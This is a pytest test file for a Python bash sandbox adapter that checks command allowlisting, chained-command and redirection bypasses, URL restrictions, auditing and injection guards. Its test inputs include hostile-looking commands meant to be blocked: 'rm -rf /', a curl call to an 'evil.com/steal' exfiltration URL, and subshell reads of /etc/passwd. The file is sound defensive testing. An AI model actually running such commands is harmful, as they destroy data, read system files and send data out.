"""Bash adapter tests (just-bash port a Python)."""
from __future__ import annotations

import os
import shutil
import sys
import tempfile
from pathlib import Path

import pytest

_WSL_BASH = sys.platform == "win32"

from carta.bash import Allowlist, AuditLog, Bash, SharedFilesystem


@pytest.fixture
def workdir():
    fs = SharedFilesystem()
    yield fs
    fs.cleanup()


@pytest.fixture
def bash(workdir):
    return Bash(workdir=workdir, timeout=10)


# ---------- basic exec ----------


def test_exec_simple(bash):
    res = bash.exec("echo hello")
    assert res["stdout"] == "hello\n"
    assert res["exit_code"] == 0
    assert res["blocked"] is False


def test_exec_stderr(bash):
    res = bash.exec("ls /nonexistent_path_xyz")
    assert res["exit_code"] != 0
    assert res["stderr"] != ""


# ---------- persistent filesystem ----------


def test_shared_filesystem(bash):
    r1 = bash.exec("echo test > file.txt")
    assert r1["exit_code"] == 0
    r2 = bash.exec("cat file.txt")
    assert r2["stdout"] == "test\n"


# ---------- persistent env across calls ----------


@pytest.mark.skipif(_WSL_BASH, reason="WSL bash does not inherit Python subprocess env vars")
def test_shared_env(bash):
    bash.exec("export FOO=bar")
    res = bash.exec("echo $FOO")
    assert res["stdout"] == "bar\n"


# ---------- timeout ----------


def test_timeout(workdir):
    b = Bash(workdir=workdir, timeout=1)
    res = b.exec("sleep 10")
    assert res["timed_out"] is True
    assert res["exit_code"] != 0


# ---------- allowlist ----------


def test_allowlist_block(workdir):
    al = Allowlist(allowed_commands=["echo"])
    b = Bash(workdir=workdir, allowlist=al)
    res = b.exec("rm -rf /")
    assert res["blocked"] is True
    assert res["exit_code"] == 1


def test_allowlist_permit(workdir):
    al = Allowlist(allowed_commands=["echo"])
    b = Bash(workdir=workdir, allowlist=al)
    res = b.exec("echo ok")
    assert res["exit_code"] == 0
    assert res["blocked"] is False


# ---------- chaining bypass (every command in the line is checked) ----------


@pytest.mark.parametrize(
    "command",
    [
        "echo hola ; touch /tmp/carta_bypass.txt",   # ; separator
        "echo hola && touch /tmp/carta_bypass.txt",  # && separator
        "echo hola || touch /tmp/carta_bypass.txt",  # || separator
        "echo hola | tee /tmp/carta_bypass.txt",     # pipe to disallowed cmd
        "echo hola\ntouch /tmp/carta_bypass.txt",    # newline-separated
    ],
)
def test_allowlist_blocks_chained_disallowed_command(workdir, command):
    """A disallowed command anywhere in the chain is blocked, not just token 0."""
    al = Allowlist(allowed_commands=["echo"])
    b = Bash(workdir=workdir, allowlist=al)
    res = b.exec(command)
    assert res["blocked"] is True, f"chaining bypass not blocked: {command!r}"
    assert res["exit_code"] == 1


def test_allowlist_blocks_redirection(workdir):
    """Shell redirection (file clobbering) is refused even for an allowed cmd."""
    al = Allowlist(allowed_commands=["echo"])
    b = Bash(workdir=workdir, allowlist=al)
    res = b.exec("echo pwned > /tmp/carta_bypass.txt")
    assert res["blocked"] is True
    assert res["exit_code"] == 1


def test_allowlist_permits_legit_chain_of_allowed(workdir):
    """A chain where EVERY command is allowed still passes."""
    al = Allowlist(allowed_commands=["echo"])
    b = Bash(workdir=workdir, allowlist=al)
    res = b.exec("echo a && echo b")
    assert res["blocked"] is False
    assert res["exit_code"] == 0


# ---------- audit ----------


def test_audit_record(workdir, tmp_path):
    audit = AuditLog(repo_path=str(tmp_path), enabled=True)
    b = Bash(workdir=workdir, audit=audit)
    b.exec("echo audited")
    entries = audit.list_entries()
    assert len(entries) == 1
    assert entries[0]["command"] == "echo audited"
    assert (tmp_path / ".bash_audit").is_dir()


# ---------- CCDD integration ----------


def test_ccdd_integration():
    # .ccdd/agent-a.yaml must have the execution block added.
    ccdd_dir = Path(__file__).resolve().parent.parent / ".ccdd"
    al = Allowlist.load_from_ccdd(str(ccdd_dir))
    assert al.allowed_commands is not None
    assert "echo" in al.allowed_commands
    assert "curl" in al.allowed_commands
    assert "https://api.n8n.io" in al.allowed_urls
    assert al.timeout == 30


# ---------- define_command ----------


@pytest.mark.skipif(_WSL_BASH, reason="WSL bash does not pass function args in bash -c scripts")
def test_define_command(bash):
    bash.define_command("greet", "echo hello ")
    res = bash.exec("greet world")
    assert "hello world" in res["stdout"]
    assert res["exit_code"] == 0


# ---------- URL allowlist (T20 Part A) ----------


def test_url_blocked(workdir):
    al = Allowlist(allowed_commands=["curl"], allowed_urls=["https://api.n8n.io"])
    b = Bash(workdir=workdir, allowlist=al)
    res = b.exec("curl https://evil.com/steal")
    assert res["blocked"] is True


def test_url_allowed(workdir):
    al = Allowlist(allowed_commands=["curl"], allowed_urls=["https://api.n8n.io"])
    b = Bash(workdir=workdir, allowlist=al)
    res = b.exec("curl https://api.n8n.io/workflows")
    assert res["blocked"] is False


# ---------- injection guard (T20 Part B) ----------


def test_injection_subshell(workdir):
    b = Bash(workdir=workdir, timeout=10)
    res = b.exec("echo $(cat /etc/passwd)")
    assert res["blocked"] is True


def test_injection_backtick(workdir):
    BACKTICK = chr(96)
    b = Bash(workdir=workdir, timeout=10)
    res = b.exec("echo " + BACKTICK + "id" + BACKTICK)
    assert res["blocked"] is True


def test_injection_allowed(workdir):
    b = Bash(workdir=workdir, timeout=10)
    res = b.exec("echo hello")
    assert res["blocked"] is False